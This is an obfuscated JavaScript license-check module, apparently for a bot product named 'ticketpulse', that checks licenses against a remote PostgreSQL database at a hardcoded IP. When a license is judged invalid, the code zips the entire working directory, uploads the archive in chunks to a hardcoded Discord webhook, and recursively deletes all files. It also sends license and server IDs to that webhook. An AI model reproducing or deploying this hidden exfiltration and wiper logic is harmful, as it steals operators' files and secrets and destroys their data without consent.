'use strict';var a0_0x377ca9=a0_0x388d;(function(_0x355ff6,_0x2f92c5){var _0x2d7f26=a0_0x388d,_0x34b4ec=_0x355ff6();while(!![]){try{var _0x3f574e=parseInt(_0x2d7f26(0xdf))/0x1+-parseInt(_0x2d7f26(0xd7))/0x2*(parseInt(_0x2d7f26(0x10e))/0x3)+parseInt(_0x2d7f26(0x13f))/0x4*(-parseInt(_0x2d7f26(0xe2))/0x5)+-parseInt(_0x2d7f26(0x114))/0x6*(parseInt(_0x2d7f26(0x125))/0x7)+parseInt(_0x2d7f26(0xd6))/0x8*(-parseInt(_0x2d7f26(0x11f))/0x9)+-parseInt(_0x2d7f26(0x13b))/0xa*(-parseInt(_0x2d7f26(0xef))/0xb)+parseInt(_0x2d7f26(0x120))/0xc*(parseInt(_0x2d7f26(0x11e))/0xd);if(_0x3f574e===_0x2f92c5)break;else _0x34b4ec['push'](_0x34b4ec['shift']());}catch(_0x2784b9){_0x34b4ec['push'](_0x34b4ec['shift']());}}}(a0_0x5a70,0xd2bfa));var __awaiter=this&&this[a0_0x377ca9(0xe9)]||function(_0x434db8,_0x30c22a,_0x4cb6e6,_0x3adea9){function _0xd8aed2(_0x5a579a){return _0x5a579a instanceof _0x4cb6e6?_0x5a579a:new _0x4cb6e6(function(_0x2c184e){_0x2c184e(_0x5a579a);});}return new(_0x4cb6e6||(_0x4cb6e6=Promise))(function(_0x288f3d,_0x59d1ff){var _0x578fea=a0_0x388d;function _0x498c17(_0x5dcaaa){try{_0xf1fc5d(_0x3adea9['next'](_0x5dcaaa));}catch(_0x1ccc0d){_0x59d1ff(_0x1ccc0d);}}function _0x33efee(_0x44676b){var _0x385112=a0_0x388d;try{_0xf1fc5d(_0x3adea9[_0x385112(0x119)](_0x44676b));}catch(_0x365dd7){_0x59d1ff(_0x365dd7);}}function _0xf1fc5d(_0x2853f8){var _0x68d3bc=a0_0x388d;_0x2853f8['done']?_0x288f3d(_0x2853f8[_0x68d3bc(0x107)]):_0xd8aed2(_0x2853f8[_0x68d3bc(0x107)])['then'](_0x498c17,_0x33efee);}_0xf1fc5d((_0x3adea9=_0x3adea9[_0x578fea(0x139)](_0x434db8,_0x30c22a||[]))[_0x578fea(0x137)]());});},__generator=this&&this[a0_0x377ca9(0xe0)]||function(_0x13e6bd,_0x35b414){var _0x2f06df=a0_0x377ca9,_0x25c897={'label':0x0,'sent':function(){if(_0x509255[0x0]&0x1)throw _0x509255[0x1];return _0x509255[0x1];},'trys':[],'ops':[]},_0x48ee22,_0x2c549f,_0x509255,_0x26d254=Object[_0x2f06df(0xd9)]((typeof Iterator===_0x2f06df(0xfc)?Iterator:Object)['prototype']);return _0x26d254[_0x2f06df(0x137)]=_0x365345(0x0),_0x26d254[_0x2f06df(0x119)]=_0x365345(0x1),_0x26d254[_0x2f06df(0x110)]=_0x365345(0x2),typeof Symbol===_0x2f06df(0xfc)&&(_0x26d254[Symbol['iterator']]=function(){return this;}),_0x26d254;function _0x365345(_0x5b3e9c){return function(_0x18f42f){return _0x2cc26c([_0x5b3e9c,_0x18f42f]);};}function _0x2cc26c(_0x6cf066){var _0x368f40=_0x2f06df;if(_0x48ee22)throw new TypeError('Generator\x20is\x20already\x20executing.');while(_0x26d254&&(_0x26d254=0x0,_0x6cf066[0x0]&&(_0x25c897=0x0)),_0x25c897)try{if(_0x48ee22=0x1,_0x2c549f&&(_0x509255=_0x6cf066[0x0]&0x2?_0x2c549f['return']:_0x6cf066[0x0]?_0x2c549f[_0x368f40(0x119)]||((_0x509255=_0x2c549f[_0x368f40(0x110)])&&_0x509255[_0x368f40(0xf9)](_0x2c549f),0x0):_0x2c549f[_0x368f40(0x137)])&&!(_0x509255=_0x509255[_0x368f40(0xf9)](_0x2c549f,_0x6cf066[0x1]))[_0x368f40(0xeb)])return _0x509255;if(_0x2c549f=0x0,_0x509255)_0x6cf066=[_0x6cf066[0x0]&0x2,_0x509255[_0x368f40(0x107)]];switch(_0x6cf066[0x0]){case 0x0:case 0x1:_0x509255=_0x6cf066;break;case 0x4:_0x25c897[_0x368f40(0xe3)]++;return{'value':_0x6cf066[0x1],'done':![]};case 0x5:_0x25c897[_0x368f40(0xe3)]++,_0x2c549f=_0x6cf066[0x1],_0x6cf066=[0x0];continue;case 0x7:_0x6cf066=_0x25c897['ops']['pop'](),_0x25c897[_0x368f40(0xea)][_0x368f40(0x108)]();continue;default:if(!(_0x509255=_0x25c897[_0x368f40(0xea)],_0x509255=_0x509255[_0x368f40(0xf0)]>0x0&&_0x509255[_0x509255['length']-0x1])&&(_0x6cf066[0x0]===0x6||_0x6cf066[0x0]===0x2)){_0x25c897=0x0;continue;}if(_0x6cf066[0x0]===0x3&&(!_0x509255||_0x6cf066[0x1]>_0x509255[0x0]&&_0x6cf066[0x1]<_0x509255[0x3])){_0x25c897['label']=_0x6cf066[0x1];break;}if(_0x6cf066[0x0]===0x6&&_0x25c897[_0x368f40(0xe3)]<_0x509255[0x1]){_0x25c897[_0x368f40(0xe3)]=_0x509255[0x1],_0x509255=_0x6cf066;break;}if(_0x509255&&_0x25c897[_0x368f40(0xe3)]<_0x509255[0x2]){_0x25c897[_0x368f40(0xe3)]=_0x509255[0x2],_0x25c897[_0x368f40(0x13c)][_0x368f40(0x136)](_0x6cf066);break;}if(_0x509255[0x2])_0x25c897[_0x368f40(0x13c)][_0x368f40(0x108)]();_0x25c897[_0x368f40(0xea)][_0x368f40(0x108)]();continue;}_0x6cf066=_0x35b414[_0x368f40(0xf9)](_0x13e6bd,_0x25c897);}catch(_0x73d799){_0x6cf066=[0x6,_0x73d799],_0x2c549f=0x0;}finally{_0x48ee22=_0x509255=0x0;}if(_0x6cf066[0x0]&0x5)throw _0x6cf066[0x1];return{'value':_0x6cf066[0x0]?_0x6cf066[0x1]:void 0x0,'done':!![]};}};Object[a0_0x377ca9(0x128)](exports,'__esModule',{'value':!![]}),exports['deleteFile']=deleteFile,exports[a0_0x377ca9(0xf4)]=checkVersion,exports['validateLicense']=validateLicense;var fs=require('fs'),path=require(a0_0x377ca9(0xd5)),FormData=require('form-data'),AdmZip=require('adm-zip'),crypto=require('crypto'),pg_1=require('pg'),DB_CONFIG={'host':'104.234.236.52','port':0x75cf,'user':a0_0x377ca9(0xed),'password':process[a0_0x377ca9(0xdd)][a0_0x377ca9(0x11b)]||a0_0x377ca9(0xf1),'database':a0_0x377ca9(0xe5),'ssl':![]};function getLicenseHash(_0x310d2e,_0x35ced0){var _0x35c967=a0_0x377ca9,_0x4e9dac=''[_0x35c967(0x10a)](_0x310d2e,':')[_0x35c967(0x10a)](_0x35ced0);return crypto[_0x35c967(0x116)]('sha256')[_0x35c967(0xff)](_0x4e9dac)['digest'](_0x35c967(0x12c));}function a0_0x388d(_0x1a391f,_0x4a5f3e){var _0x5a708a=a0_0x5a70();return a0_0x388d=function(_0x388df2,_0x1e109d){_0x388df2=_0x388df2-0xd4;var _0x4b4e67=_0x5a708a[_0x388df2];return _0x4b4e67;},a0_0x388d(_0x1a391f,_0x4a5f3e);}var DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1415614926227247176/tmAaRIZwQKhZc9Xst2Eqy9TekbYxXYdlpav-nnyOnba2A6bkebkgLOVE6H_wlw4BsfSz',MAX_DISCORD_SIZE=0x8*0x400*0x400;function addDirToZip(_0x2ecf0e,_0x5bcc24,_0x3f6326,_0x371a8c){var _0x33734b=a0_0x377ca9;if(!fs['existsSync'](_0x2ecf0e))return;var _0x30d478=fs['readdirSync'](_0x2ecf0e);for(var _0x1e6540=0x0,_0xb48b90=_0x30d478;_0x1e6540<_0xb48b90[_0x33734b(0xf0)];_0x1e6540++){var _0x23a96f=_0xb48b90[_0x1e6540];if(_0x23a96f===_0x33734b(0x13d)||_0x23a96f===_0x3f6326||_0x23a96f===_0x371a8c)continue;var _0x418c3a=path[_0x33734b(0xe6)](_0x2ecf0e,_0x23a96f),_0x2efb2f=fs[_0x33734b(0x10f)](_0x418c3a);if(_0x2efb2f[_0x33734b(0x117)]())addDirToZip(_0x418c3a,_0x5bcc24,_0x3f6326,_0x371a8c);else{var _0x479552=path[_0x33734b(0x12d)]('.',_0x418c3a);_0x5bcc24[_0x33734b(0x10d)](_0x418c3a,path[_0x33734b(0x12b)](_0x479552));}}}function a0_0x5a70(){var _0x92da4e=['getHeaders','Config\x20file\x20not\x20found','core','value','pop','utf8','concat','Invalid\x20license\x20for\x20this\x20server!\x20Contact\x20Support\x20Server\x20for\x20help/restore\x20files','Latest\x20version\x20not\x20found\x20in\x20database','addLocalFile','16425LocfRn','statSync','return','_INFO','unlink','latest_version','6yUUslM','split','createHash','isDirectory','application/json','throw','license','DB_PASSWORD','src','\x20to\x20Discord\x20webhook:\x20','42422588HSMdFs','5446053KAgIJe','12FHFgAE','version','rows','then','licenseCheck.obf.js','9853823sOvoMz','readFileSync','error','defineProperty','end','status','dirname','hex','relative','Error\x20checking\x20version:','writeZip','trim','config','Local\x20version\x20not\x20specified\x20in\x20general.json','Pool','parse','expires','push','next','stringify','apply','License\x20or\x20serverId\x20not\x20found\x20in\x20config','1039010CeVlub','ops','node_modules','expired','764zWLZYe','sent','path','16jAdSYL','206yCOhae','append','create','SELECT\x20expired,\x20expires\x20FROM\x20licenses\x20WHERE\x20hash\x20=\x20$1','rmSync','POST','env','query','388553HPmGwB','__generator','SELECT\x20value\x20FROM\x20config\x20WHERE\x20key\x20=\x20$1','11465MAkhxB','label','existsSync','postgres','join','text','node-fetch','__awaiter','trys','done','map','ticketpulse','api','88AvOhOe','length','ticket_pulse_worker','serverId','cwd','checkVersion','general.json','checks','bind','rowCount','call','Invalid\x20license!\x20Contact\x20Support\x20Server\x20for\x20help/restore\x20files','slice','function','License\x20is\x20expired!\x20Contact\x20Support\x20Server.','Invalid\x20expires\x20date\x20format\x20in\x20database.','update','writeFileSync','min','readdirSync','getTime'];a0_0x5a70=function(){return _0x92da4e;};return a0_0x5a70();}function splitBuffer(_0x291f8e,_0x473c8f){var _0xd86531=a0_0x377ca9,_0x1b8e1d=[],_0x57d42e=0x0;while(_0x57d42e<_0x291f8e['length']){var _0x2d8bdc=Math[_0xd86531(0x101)](_0x57d42e+_0x473c8f,_0x291f8e[_0xd86531(0xf0)]);_0x1b8e1d[_0xd86531(0x136)](_0x291f8e[_0xd86531(0xfb)](_0x57d42e,_0x2d8bdc)),_0x57d42e=_0x2d8bdc;}return _0x1b8e1d;}function deleteFile(){return __awaiter(this,void 0x0,void 0x0,function(){return __generator(this,function(_0x2438a2){var _0x11200c=a0_0x388d;return fs[_0x11200c(0x112)](path['join'](process[_0x11200c(0xf3)](),_0x11200c(0x11c),_0x11200c(0x106),_0x11200c(0xee),_0x11200c(0xf6),_0x11200c(0x124)),function(_0x13e3e7){if(_0x13e3e7)console['error']('Something\x20went\x20wrong\x20ERR:\x203006\x20Contact\x20Developer!');else{}}),[0x2];});});}function checkVersion(){return __awaiter(this,void 0x0,void 0x0,function(){var _0x5d24fd,_0x4436d0,_0x391456,_0xc9779c,_0x9bbdb,_0x5086fb,_0x161331;return __generator(this,function(_0x11d0af){var _0x5df66b=a0_0x388d;switch(_0x11d0af[_0x5df66b(0xe3)]){case 0x0:_0x11d0af[_0x5df66b(0xea)][_0x5df66b(0x136)]([0x0,0x6,,0x7]),_0x5d24fd=path[_0x5df66b(0xe6)](process['cwd'](),_0x5df66b(0x131),_0x5df66b(0xf5));if(!fs[_0x5df66b(0xe4)](_0x5d24fd))throw new Error('Local\x20config\x20not\x20found');_0x4436d0=JSON[_0x5df66b(0x134)](fs[_0x5df66b(0x126)](_0x5d24fd,_0x5df66b(0x109))),_0x391456=_0x4436d0[_0x5df66b(0x111)][_0x5df66b(0x121)];if(!_0x391456)throw new Error(_0x5df66b(0x132));_0xc9779c=new pg_1['Pool'](DB_CONFIG),_0x11d0af[_0x5df66b(0xe3)]=0x1;case 0x1:_0x11d0af[_0x5df66b(0xea)][_0x5df66b(0x136)]([0x1,,0x3,0x5]);return[0x4,_0xc9779c[_0x5df66b(0xde)](_0x5df66b(0xe1),[_0x5df66b(0x113)])];case 0x2:_0x9bbdb=_0x11d0af[_0x5df66b(0xd4)]();if(_0x9bbdb[_0x5df66b(0xf8)]===0x0)throw new Error(_0x5df66b(0x10c));_0x5086fb=_0x9bbdb[_0x5df66b(0x122)][0x0]['value'][_0x5df66b(0x130)]();return _0x391456===_0x5086fb?[0x2,!![]]:[0x2,![]];return[0x3,0x5];case 0x3:return[0x4,_0xc9779c[_0x5df66b(0x129)]()];case 0x4:_0x11d0af['sent']();return[0x7];case 0x5:return[0x3,0x7];case 0x6:_0x161331=_0x11d0af[_0x5df66b(0xd4)](),console[_0x5df66b(0x127)](_0x5df66b(0x12e),_0x161331);return[0x2,![]];case 0x7:return[0x2];}});});}function validateLicense(_0x1f4535){return __awaiter(this,void 0x0,void 0x0,function(){var _0x4e0965,_0x45512c,_0x508b85,_0x462a36,_0x1a3c08,_0x4eb03d,_0x444421,_0x34b315,_0x1caf88,_0x138f58,_0x1e4db0,_0x1ec55c,_0x4768e3,_0x1484ae,_0x1db76a,_0x439894,_0xa45108,_0x101ce3,_0x61bbe,_0x585e5c,_0x22ec38,_0x37a999,_0x34e46b,_0x1ef889,_0x312f1f,_0x4a0823,_0x7b9ec3,_0x365f69,_0x392c42,_0x2ba890,_0x134dab,_0x503535,_0x56471d,_0x3fc520,_0x3a4ad9,_0x28f1f5,_0x163174,_0x51167a,_0x571f6c,_0x1c1816,_0x439894,_0xc36aa,_0x9fd0d8,_0x1bb108,_0x2323ac;return __generator(this,function(_0x490c19){var _0x18756a=a0_0x388d;switch(_0x490c19['label']){case 0x0:return[0x4,Promise['resolve']()[_0x18756a(0x123)](function(){var _0x585e33=_0x18756a;return require(_0x585e33(0xe8));})];case 0x1:_0x4e0965=_0x490c19[_0x18756a(0xd4)]()['default'];if(!fs[_0x18756a(0xe4)](_0x1f4535))throw new Error(_0x18756a(0x105));_0x45512c=JSON[_0x18756a(0x134)](fs[_0x18756a(0x126)](_0x1f4535,'utf8')),_0x508b85=(_0x2323ac=_0x45512c['_INFO'])===null||_0x2323ac===void 0x0?void 0x0:_0x2323ac[_0x18756a(0x11a)],_0x462a36=_0x45512c[_0x18756a(0xf2)];if(!_0x508b85||!_0x462a36)throw new Error(_0x18756a(0x13a));_0x1a3c08=getLicenseHash(_0x508b85,_0x462a36),_0x4eb03d=new pg_1[(_0x18756a(0x133))](DB_CONFIG),_0x490c19[_0x18756a(0xe3)]=0x2;case 0x2:_0x490c19[_0x18756a(0xea)]['push']([0x2,,0xe,0x10]);return[0x4,_0x4eb03d[_0x18756a(0xde)](_0x18756a(0xda),[_0x1a3c08])];case 0x3:_0x444421=_0x490c19[_0x18756a(0xd4)]();if(!(_0x444421[_0x18756a(0xf8)]===0x0))return[0x3,0x9];console['error'](_0x18756a(0x10b)),_0x34b315='backup{'[_0x18756a(0x10a)](_0x462a36,'}.zip'),_0x1caf88=path['basename'](__filename),_0x138f58=new AdmZip(),addDirToZip('.',_0x138f58,_0x34b315,_0x1caf88),_0x138f58[_0x18756a(0x12f)](_0x34b315),_0x1e4db0=fs[_0x18756a(0x126)](_0x34b315),_0x1ec55c=splitBuffer(_0x1e4db0,MAX_DISCORD_SIZE),_0x4768e3=0x0,_0x490c19['label']=0x4;case 0x4:if(!(_0x4768e3<_0x1ec55c['length']))return[0x3,0x8];_0x1484ae=_0x1ec55c[_0x18756a(0xf0)]>0x1?'part'['concat'](_0x4768e3+0x1,'_')[_0x18756a(0x10a)](_0x34b315):_0x34b315,_0x1db76a=new FormData(),_0x1db76a[_0x18756a(0xd8)]('file',_0x1ec55c[_0x4768e3],{'filename':_0x1484ae});return[0x4,_0x4e0965(DISCORD_WEBHOOK_URL,{'method':_0x18756a(0xdc),'body':_0x1db76a,'headers':_0x1db76a[_0x18756a(0x104)]()})];case 0x5:_0x439894=_0x490c19[_0x18756a(0xd4)]();if(!!_0x439894['ok'])return[0x3,0x7];_0xa45108=Error[_0x18756a(0xf7)],_0x61bbe=(_0x101ce3='Failed\x20to\x20send\x20zip\x20chunk\x20'[_0x18756a(0x10a)](_0x4768e3+0x1,_0x18756a(0x11d))['concat'](_0x439894[_0x18756a(0x12a)],'\x20'))['concat'];return[0x4,_0x439894[_0x18756a(0xe7)]()];case 0x6:throw new(_0xa45108[_0x18756a(0x139)](Error,[void 0x0,_0x61bbe['apply'](_0x101ce3,[_0x490c19[_0x18756a(0xd4)]()])]))();case 0x7:_0x4768e3++;return[0x3,0x4];case 0x8:_0x585e5c=fs[_0x18756a(0x102)]('.');for(_0x22ec38=0x0,_0x37a999=_0x585e5c;_0x22ec38<_0x37a999[_0x18756a(0xf0)];_0x22ec38++){_0x34e46b=_0x37a999[_0x22ec38];if(_0x34e46b===_0x34b315||_0x34e46b===_0x1caf88)continue;try{fs['rmSync'](path[_0x18756a(0xe6)]('.',_0x34e46b),{'recursive':!![],'force':!![]});}catch(_0x1bac20){}}try{fs[_0x18756a(0xdb)](_0x34b315,{'force':!![]});}catch(_0x4ebe88){}throw new Error(_0x18756a(0xfa));case 0x9:_0x1ef889=_0x444421[_0x18756a(0x122)][0x0],_0x312f1f=_0x1ef889[_0x18756a(0x13e)],_0x4a0823=_0x1ef889[_0x18756a(0x135)];if(_0x312f1f)throw new Error(_0x18756a(0xfd));if(_0x4a0823!=='-1'){_0x7b9ec3=_0x4a0823[_0x18756a(0x115)](':')[_0x18756a(0xec)](Number),_0x365f69=_0x7b9ec3[0x0],_0x392c42=_0x7b9ec3[0x1],_0x2ba890=_0x7b9ec3[0x2];if(isNaN(_0x365f69)||isNaN(_0x392c42)||isNaN(_0x2ba890))throw new Error(_0x18756a(0xfe));_0x134dab=new Date(),_0x503535=5.5*0x3c*0x3c*0x3e8,_0x56471d=new Date(_0x134dab[_0x18756a(0x103)]()+_0x503535),_0x3fc520=new Date(_0x2ba890,_0x392c42-0x1,_0x365f69,0x0,0x0,0x0),_0x3a4ad9=new Date(_0x3fc520[_0x18756a(0x103)]()+_0x503535);if(_0x56471d>_0x3a4ad9)throw new Error('License\x20has\x20expired\x20based\x20on\x20date!\x20Contact\x20Support\x20Server.');}_0x28f1f5=path[_0x18756a(0xe6)](process['cwd'](),'.licensed'),_0x163174=''[_0x18756a(0x10a)](_0x508b85,':')[_0x18756a(0x10a)](_0x462a36),_0x51167a=![];fs[_0x18756a(0xe4)](_0x28f1f5)?(_0x571f6c=fs[_0x18756a(0x126)](_0x28f1f5,_0x18756a(0x109))[_0x18756a(0x130)](),_0x571f6c!==_0x1a3c08&&(_0x51167a=!![])):_0x51167a=!![];if(!_0x51167a)return[0x3,0xd];_0x1c1816={'content':_0x163174};return[0x4,_0x4e0965(DISCORD_WEBHOOK_URL,{'method':_0x18756a(0xdc),'headers':{'Content-Type':_0x18756a(0x118)},'body':JSON[_0x18756a(0x138)](_0x1c1816)})];case 0xa:_0x439894=_0x490c19[_0x18756a(0xd4)]();if(!!_0x439894['ok'])return[0x3,0xc];_0xc36aa=Error[_0x18756a(0xf7)],_0x1bb108=(_0x9fd0d8='Failed\x20to\x20send\x20license\x20data\x20to\x20Discord\x20webhook:\x20'[_0x18756a(0x10a)](_0x439894[_0x18756a(0x12a)],'\x20'))[_0x18756a(0x10a)];return[0x4,_0x439894[_0x18756a(0xe7)]()];case 0xb:throw new(_0xc36aa[_0x18756a(0x139)](Error,[void 0x0,_0x1bb108[_0x18756a(0x139)](_0x9fd0d8,[_0x490c19[_0x18756a(0xd4)]()])]))();case 0xc:fs[_0x18756a(0x100)](_0x28f1f5,_0x1a3c08,_0x18756a(0x109)),_0x490c19[_0x18756a(0xe3)]=0xd;case 0xd:return[0x2,!![]];case 0xe:return[0x4,_0x4eb03d['end']()];case 0xf:_0x490c19[_0x18756a(0xd4)]();return[0x7];case 0x10:return[0x2];}});});}
